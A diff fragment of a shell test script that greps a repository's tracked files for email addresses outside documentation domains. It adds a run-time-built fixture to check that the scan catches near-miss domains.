+	grep -hoIE '[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)+' "$@" |
+		grep -vE '@((.+\.)?example\.(org|com|net)|.+\.(example|test|invalid))$|^[0-9]+\+cayossarian@users\.noreply\.github\.com$' || true
+}
+mapfile -t tracked < <(git -C "$root" ls-files)
+expect_eq "addresses: the tracked files are listed" "$((${#tracked[@]} > 50))" 1
+expect_eq "addresses: none outside the documentation domains" "$(cd "$root" && addresses "${tracked[@]}")" ""
+# (the addresses are put together at run time, so this file holds none)
+at=@
+printf 'a %s b\nc %s\nd %s\n' "maintainer${at}example-mail.net" "someone${at}example.net.invalid.org" "x${at}example.org" >"$T/mutant.txt"
+expect_eq "addresses: the scan finds an address, and one that only starts like a documentation domain" \
+	"$(addresses "$T/mutant.txt" | tr '\n' ' ')" "maintainer${at}example-mail.net someone${at}example.net.invalid.org "
 
 # --- copyright headers ---------------------------------------------------------------
 # every non-trivial file added since per-package publishing (6699843) carries the header as line 2,
